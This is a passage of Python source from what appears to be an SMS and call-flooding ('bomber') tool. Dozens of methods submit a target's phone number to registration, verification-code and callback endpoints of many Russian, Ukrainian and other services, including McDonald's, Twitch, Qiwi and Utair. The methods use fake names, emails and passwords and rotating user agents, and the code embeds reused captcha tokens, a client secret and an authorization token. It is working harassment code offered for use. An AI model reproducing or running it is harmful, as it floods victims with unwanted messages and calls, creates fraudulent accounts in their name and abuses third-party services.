        json={"name":_ru_name_(),"email":email(),"phone":self.phone_not_pluse,"social":"false","time_zone":-180,"screen_size":"2048×1080x24","system_fonts":"Arial, Arial Narrow, Bitstream Vera Sans Mono, Bookman Old Style, Century Schoolbook, Courier, Courier New, Helvetica, Palatino, Palatino Linotype, Times, Times New Roman",
        "supercookie":"DOM localStorage, DOM sessionStorage"}, headers=headers_copy))

    def macdonal(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        asyncio.run(options_data_url('https://site-api.mcdonalds.ru/api/v1/user/login/phone', headers=headers_copy))
        asyncio.run(post_data_url('https://site-api.mcdonalds.ru/api/v1/user/login/phone', json={"number":self.phone,"g-recaptcha-response":"03AGdBq24rQ30xdNbVMpOibIqu-cFMr5eQdEk5cghzJhxzYHbGRXKwwJbJx7HIBqh5scCXIqoSm403O5kv1DNSrh6EQhj_VKqgzZePMn7RJC3ndHE1u0AwdZjT3Wjta7ozISZ2bTBFMaaEFgyaYTVC3KwK8y5vvt5O3SSts4VOVDtBOPB9VSDz2G0b6lOdVGZ1jkUY5_D8MFnRotYclfk_bRanAqLZTVWj0JlRjDB2mc2jxRDm0nRKOlZoovM9eedLRHT4rW_v9uRFt34OF-2maqFsoPHUThLY3tuaZctr4qIa9JkfvfbVxE9IGhJ8P14BoBmq5ZsCpsnvH9VidrcMdDczYqvTa1FL5NbV9WX-gOEOudLhOK6_QxNfcAnoU3WA6jeP5KlYA-dy1YxrV32fCk9O063UZ-rP3mVzlK0kfXCK1atFsBgy2p4N7MlR77lDY9HybTWn5U9V"}, headers=headers_copy))

    def findclone(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        asyncio.run(get_data_url(f'https://findclone.ru/register?phone={self.phone}', headers=headers_copy))

    def eshko(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        asyncio.run(post_data_url('https://www.eshko.by/orders/create/free_download',
        data={'kurs':'1', 'iname':_ru_name_(), 'fname':_ru_name_(), 'email':email(),
        'phone':self.phone}, headers=headers_copy))

    def dtrparts(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        asyncio.run(post_data_url('https://dtrparts.by/',headers=headers, data={'mark':name(), 'text-breake':' ', 'phone':self.phone, 'submit':'%D0%A0%D0%B0%D1%81%D1%81%D1%87%D0%B8%D1%82%D0%B0%D1%82%D1%8C'}))

    def smsint2(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        asyncio.run(post_data_url('https://smsint.ru/bitrix/templates/sms_intel/ajax/registration.php',
        data={'phone':self.phone_not_pluse, 'name':_ru_name_(), 'code':' ', 'fpc':'null'}, headers=headers_copy))

    def turbosms(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        asyncio.run(post_data_url('https://turbosms.ua/registration.html', headers=headers_copy,
        data={'country':'1', 'login':username(), 'phone':self.phone_not_pluse[1:], 'email': email(),
        'password':password(), 'agry':'on', 'send':'%D0%97%D0%B0%D1%80%D0%B5%D0%B3%D0%B8%D1%81%D1%82%D1%80%D0%B8%D1%80%D0%BE%D0%B2%D0%B0%D1%82%D1%8C%D1%81%D1%8F'}))


    def www360(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        asyncio.run(post_data_url('https://www.360.by/ajax/sendActivationStep',
        data={'phone':self.phone, 'step':'phone_validate'}, headers=headers_copy))

    def delivio(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        asyncio.run(post_data_url('https://delivio.by/be/api/user/check', json={"phone":self.phone}, headers=headers_copy))

    def carte(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        asyncio.run(post_data_url('https://carte.by/auth/', data={'ajax':'register', 'login':username(), 'pass':password(), 'phone':self.phone, 'company':0, 'resend':1, 'checksum':504}, headers=headers_copy))

    def farmakopeika(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        asyncio.run(post_data_url('https://farmakopeika.ru/local/ajax/forms/re_call_form.php',data={'WEB_FORM_ID':1, 'sessid':'47ea89r6ca1b105894td0eea3a4e5f0g', 'phone':self.phone_not_pluse[1:], 'name':name()}, headers=headers_copy))

    def farmacia24(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        asyncio.run(options_data_url(f'https://admin.24farmacia.ru/api_new/user/phone?phone={self.phone_not_pluse[1:]}', headers=headers_copy))
        asyncio.run(get_data_url(f'https://admin.24farmacia.ru/api_new/user/phone?phone={self.phone_not_pluse[1:]}', headers=headers_copy))

    def wowworks2(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        asyncio.run(options_data_url('https://api.wowworks.ru/v2/site/send-code/site/registration', headers=headers_copy))
        asyncio.run(post_data_url('https://api.wowworks.ru/v2/site/send-code/site/registration', headers=headers_copy, json={"phone":self.phone_not_pluse,"validKey":"43aGdBq490DСiK4xRiКgF3moD1ou-oPDAnHakhad_YRRtWAl9W7pXP6jUijm9d2wNC5wiGeypWL2rD5i09ThyuOmM7QyDE0ROqB1cHJMoOP2vkgZSsWjIzCbGtkVfji1CLsxX0lpQ_tDhtqQ9yUzkLJX9XPb_1rQvQT3Ni14f04HV8zqZ-9c9VWTK50cZykfgmvW6qzVDEeGXO8tCyx8r1MREFJTi2VQJOnFncqhCQBbb9g1z0lZKpsaypJwdt6atEPan1Jv2Crb8UrKTYMhf_JTur5OOlOvJDmlD02H3b2j7xHOECtGxBhpxzfqeCL4C2gpplwAqNXw4zSg79T5o-S_PD21d9Uze3-Px84hFBc0dIZM0z324QYzKhgmLJCxuzFVADOLJsxevND84NQbNcme_ERc0cWGLnX6p33RhX-7jERFKXjuu3aQglyYg8S8Cuv-UlVQY25a-y"}))

    def bigd_host(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        asyncio.run(post_data_url(f'https://bigd.host/Settings/SendPhoneVerificationCodeAjax?phoneNumber={self.phone}', headers=headers_copy))

    def cian(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        agent = user_agent()
        asyncio.run(options_data_url(f'https://api.cian.ru/sms/v1/send-code/', headers=headers_copy))
        asyncio.run(post_data_url(f'https://api.cian.ru/sms/v1/send-code/', headers=headers_copy, json={"phone":self.phone,"type":"authenticateCode"}))

    def sushiwokru(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        asyncio.run(post_data_url('https://sushiwok.ru/user/phone/validate', headers=headers_copy, json={"phone":phone_mask(self.phone_not_pluse,'+#(###)###-##-##'),"numbers":4}))

    def bettery_ru(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        asyncio.run(post_data_url('https://clientsapi02.at-resources.com/cps/superRegistration/createProcess', headers=headers, json={"fio":_ru_name_(),"password":f' {password()}',"email":email(),"emailAdvertAccepted":'true', "phoneNumber":self.phone, "webReferrer":"","advertInfo":"","platformInfo":headers_copy['User-Agent'],"promoId":"","sysId":1,"lang":"ru"}))

    def pass_media(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        asyncio.run(get_data_url(f'https://pass.media/api/actions/check_phone/?phone={phone_mask(self.phone_not_pluse,"+# ### ### ## ##")}', headers=headers_copy))

    def autheasypayua(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        asyncio.run(post_data_url(f'https://auth.easypay.ua/api/users/desktop/forgot/{self.phone_not_pluse}', headers=headers_copy))

    def ionua(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        asyncio.run(post_data_url('https://ion.ua/api/apr/temporary-register', headers=headers_copy, json={'login': self.phone}))

    def sloncreditua(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        asyncio.run(post_data_url('https://sloncredit.ua/client/login', headers=headers_copy, data={'phone': self.phone}))

    def backzecreditcomua(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        asyncio.run(post_data_url('https://back.zecredit.com.ua/v1/api/rest/verifications', headers=headers_copy, json={'phone': self.phone_not_pluse, 'action': 'REGISTRATION'}))

    def ontaxicomua(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        asyncio.run(post_data_url('https://ontaxi.com.ua/api/v2/web/client', headers=headers_copy, json={'country': 'UA', 'phone': self.phone_not_pluse[2:]}))

    def ukloncomua_two(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        asyncio.run(post_data_url('https://uklon.com.ua/api/v1/account/code/send', headers=headers_copy, json={'phone': self.phone_not_pluse}))

    def partner_uklo_two(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        asyncio.run(post_data_url('https://partner.uklon.com.ua/api/v1/registration/sendcode', headers=headers_copy, json={'phone': self.phone_not_pluse}))

    def alloua(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        asyncio.run(post_data_url('https://allo.ua/ua/customer/account/createPostVue/?isAjax=1&currentLocale=uk_UA', headers=headers_copy, data={'firstname': _ru_name_(), 'telephone': self.phone_not_pluse[1:], 'email': email(), 'password': '46lX2dnyUhDQ', 'form_key': 'No7l3BqVVoQJ6Djm'}))

    def n17459yclientscom(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        asyncio.run(post_data_url('https://n17459.yclients.com/api/v1/book_code/26760', headers=headers_copy, json={'phone': self.phone_not_pluse}))

    def passporttwitchtv_two(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        asyncio.run(post_data_url('https://passport.twitch.tv/register?trusted_request=true', headers=headers_copy, json={'birthday': {'day': 1, 'month': 9, 'year': 1997}, 'client_id': 'kd1unb4b3q4t58fwlpcbzcbnm76a8fp', 'include_verification_code': True, 'password': password(), 'phone_number': self.phone_not_pluse, 'username': username()}))

    def apiiconjob_co_two(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        asyncio.run(post_data_url('https://api.iconjob.co/api/auth/verification_code', headers=headers_copy, json={'phone': self.phone_not_pluse}))

    def ggbetru(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        asyncio.run(post_data_url('https://ggbet.ru/api/auth/register-with-phone', headers=headers_copy, data={'phone':self.phone, 'login': email(), 'password': password(), 'agreement': 'on', 'oferta': 'on'}))

    def durexrubackendprod(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        asyncio.run(post_data_url('https://durex-ru-backend.prod.moscow.rbdigitalcloud.com/api/v1/users/confirmation_code/', headers=headers_copy, json={'phone': self.phone_not_pluse}))



    def wwwdnsshopru_two(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        asyncio.run(post_data_url('https://www.dns-shop.ru/auth/auth/fast-authorization/', headers=headers_copy, data={'FastAuthorizationLoginLoadForm[login]': self.phone_not_pluse, 'FastAuthorizationLoginLoadForm[token]': ''}))


    def almatyinstashopkz(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        asyncio.run(post_data_url('https://almaty.instashop.kz/?login=yes', headers=headers_copy, data={'AUTH_FORM': 'Y', 'USER_REMEMBER': 'Y', 'backurl': '', 'TYPE': 'CHECKLOGIN', 'is_ajax_request': 'Y', 'USER_COUNTRY': self.country_code, 'USER_LOGIN': phone_mask(self.phone_not_pluse[1:], '###-###-##-##')}))


    def gdz_ruwork(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        asyncio.run(post_data_url('https://gdz-ru.work/api/subscriptions/subscribe/45?', headers=headers_copy, params={'return_to': '/subscribe/?return_to=%2Fgdz%2Falgebra%2F8-klass%2Fmuravin', 'book_id': '23143', 'src_host': 'gdz.ltd', 'woid': '275004200', 'msisdn': self.phone_not_pluse, 'agreement': '1'}))


    def smotrimru(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        asyncio.run(post_data_url('https://smotrim.ru/login', headers=headers_copy, data={'phone': self.phone_not_pluse}))


    def wwwriglaru(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        asyncio.run(post_data_url('https://www.rigla.ru/rest/V1/mindbox/account/generateSMS', headers=headers_copy, json={'telephone': self.phone_not_pluse}))


    def loymaxivoinru(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        asyncio.run(post_data_url('https://loymax.ivoin.ru/publicapi/v1.2/Registration/BeginRegistration', headers=headers_copy, json={'password': '', 'login': self.phone_not_pluse}))


    def amurfarmaru(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        asyncio.run(post_data_url('https://amurfarma.ru/local/templates/amurfarmacy_2015/ajax.php', headers=headers_copy, data={'ajaxtype': 'send_sms', 'phone': phone_mask(self.phone, '+# (###) ###-##-##')}))


    def kulinaristamarket(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        asyncio.run(post_data_url('https://kulinarista.market/api/v1/auth/sms-code', headers=headers_copy, json={'phone': self.phone_not_pluse[1:]}))


    def aptekamagnitu(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        asyncio.run(post_data_url('https://apteka.magnit.ru/api/personal/auth/code/', headers=headers_copy, data={'phone': self.phone_not_pluse}))


    def autodozvon(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        asyncio.run(post_data_url('https://autodozvon.ru/test/makeTestCall', headers=headers_copy, params = {'to': phone_mask(self.phone_not_pluse[1:], "(###) ##-##-##)")}))


    def htvplatform24tv(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        asyncio.run(post_data_url('https://24htv.platform24.tv/v2/otps', headers=headers_copy, json = {'phone':self.phone_not_pluse}))


    def apilike_videocom(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        asyncio.run(post_data_url('https://api.like-video.com/likee-activity-flow-micro/commonApi/sendDownloadSms', headers=headers_copy, json = {'telephone': self.phone_not_pluse, 'lang': "ru"}))


    def mydrom_ru(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        asyncio.run(post_data_url('https://my.drom.ru/sign/recover?return=https%3A%2F%2Fchelyabinsk.drom.ru%2Fauto%2Fall%2F%3Futm_source%3Dyandexdirect%26utm_medium%3Dcpc%26utm_campaign%3Ddrom_74_chelyabinsk_auto-rivals_alldevice_search_handmade%26utm_content%3Ddesktop_search_text_main%26utm_term%3D%25D0%25B0%25D0%25B2%25D1%2582%25D0%25BE%25D1%2580%25D1%2583%2520%25D1%2587%25D0%25B5%25D0%25BB%25D1%258F%25D0%25B1%25D0%25B8%25D0%25BD%25D1%2581%25D0%25BA%26_openstat%3DZGlyZWN0LnlhbmRleC5ydTsxNzY3NTA4MzsxOTMxNzMyNzE4O3lhbmRleC5ydTpwcmVtaXVt%26yclid%3D7777444668347802164%26tcb%3D1609147011', headers=headers_copy, data = {'sign':self.phone_not_pluse}))


    def harabaru(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        asyncio.run(post_data_url('https://haraba.ru/Account/Register', headers=headers_copy, data = {'phone': self.phone_not_pluse,'pass1': 'Myp-Vbq-RbE-zvH','pass2': 'Myp-Vbq-RbE-zvH','ip': None,'type': 1,'company': None}))


    def zaimbistrodengi(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        asyncio.run(post_data_url('https://zaim.bistrodengi.ru/sdo/user/loginLK', headers=headers_copy, json = {'name': "Арсений Анатольевич", 'phoneNumber': self.phone_not_pluse, 'birthDate': "1984-01-04"}))


    def passrutuberu(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        asyncio.run(get_data_url('https://pass.rutube.ru/api/accounts/user-exists/', headers=headers_copy, params = {'phone': self.phone} ))


    def mobileapiqiwicom(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        asyncio.run(post_data_url('https://mobile-api.qiwi.com/oauth/authorize', headers=headers_copy, data = {'response_type': 'urn:qiwi:oauth:response-type:confirmation-id', 'username': self.phone, 'client_id': 'android-qw', 'client_secret': 'zAm4FKq9UnSe7id'}))

    def medicina360ru(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        asyncio.run(post_data_url('https://medicina360.ru/site/generatesmscode', headers=headers_copy, data = {'phone': phone_mask(self.phone_not_pluse, "+# (###) ###-##-##"),'send_sms': 1}))

    def apieldoradoua_two(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        asyncio.run(get_data_url(f'https://api.eldorado.ua/v2.0/sign?lang=ua&action=phone_check&login={self.phone_not_pluse}', headers=headers_copy))

    def wwwutairru(self):
        token = 'Token eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJqdGkiOiI1NjkzIiwic2NvcGVzIjpbInVzZXIucHJvZmlsZSIsInVzZXIucHJvZmlsZS5lZGl0IiwidXNlci5wcm9maWxlLnJlcmVnaXN0cmF0aW9uIiwidXNlci5ib251cyIsInVzZXIucGF5bWVudHMuY2FyZHMiLCJ1c2VyLnJlZmVycmFscyIsInVzZXIuc3lzdGVtLmZlZWRiYWNrIiwidXNlci5jb21wYW55IiwidXNlci5leHBlcmVtZW50YWwucnpkIiwiYXBwLnVzZXIucmVnaXN0cmF0aW9uIiwiYXBwLmJvbnVzIiwiYXBwLmJvb2tpbmciLCJhcHAuY2hlY2tpbiIsImFwcC5haXJwb3J0cyIsImFwcC5jb3VudHJpZXMiLCJhcHAudG91cnMiLCJhcHAucHJvbW8iLCJhcHAuc2NoZWR1bGUiLCJhcHAucHJvbW8ucHJlcGFpZCIsImFwcC5zeXN0ZW0uZmVlZGJhY2siLCJhcHAuc3lzdGVtLnRyYW5zYWN0aW9ucyIsImFwcC5zeXN0ZW0ucHJvZmlsZSIsImFwcC5zeXN0ZW0udGVzdC5hY2NvdW50cyIsImFwcC5zeXN0ZW0ubGlua3MiLCJhcHAuc3lzdGVtLm5vdGlmaWNhdGlvbiIsImFwcC5kYWRhdGEiLCJhcHAuYWIiLCJhcHAuY29tcGFueSIsImFwcC5zZXJ2aWNlcyJdLCJleHAiOjE2NDExODIzNDh9.crO5rLAZ1btPDgplxCVPjx9NtO_nHB7I83Gyf1QYeGE'

        asyncio.run(post_data_url('https://www.utair.ru/mobile/api/v8/account/profile', json = {'login': self.phone_not_pluse, 'confirmationGDPRDate': '1609647178956'}, headers = {'Authorization':token,'User-Agent':'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 YaBrowser/19.6.1.153 Yowser/2.5 Safari/537.36'}))
        asyncio.run(post_data_url('https://www.utair.ru/mobile/api/v8/user/login', json = {'login': self.phone_not_pluse, 'confirmationType': "callCode"}, headers = {'Authorization':token,'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 YaBrowser/19.6.1.153 Yowser/2.5 Safari/537.36'}))

    def x80aaiccccwa6aik(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        asyncio.run(post_data_url(f'https://xn--80aaiccccwa6aiktadcodj9azr.xn--p1ai/ajax/vote.php?mode=sendphone&vote_id=109&vote_phone={phone_mask(self.phone_not_pluse,"+# (###) ###-##-##")}&url=https://xn--80aaiccccwa6aiktadcodj9azr.xn--p1ai/', headers=headers_copy))

    def disk_apimegafonru(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        asyncio.run(post_data_url('https://disk-api.megafon.ru/api/3/md_otp_tokens/', json = {'phone':self.phone_not_pluse}, headers=headers_copy))


    def apteka_one(self):
        try:
            auth_html = asyncio.run(get_data_url('https://apteka38plus.ru/register'))
            auth_bs = bs(auth_html.content, 'html.parser')
            token = auth_bs.select('meta[name=csrf-token]')[0]['content']
            password = password()
            for i in range(2):
                asyncio.run(post_data_url('https://apteka38plus.ru/register/confirm',data={'_token': token, 'name': _ru_name_(),
                            'phone': phone_mask(self.phone_not_pluse, '+# (###) ###-##-##'),
                             'email': email(), 'password': password, 'password_confirmation': password,
                             'redirect_to': 'https://apteka38plus.ru/verify', 'notify_offers': 'on'}))
        except:
            pass

#
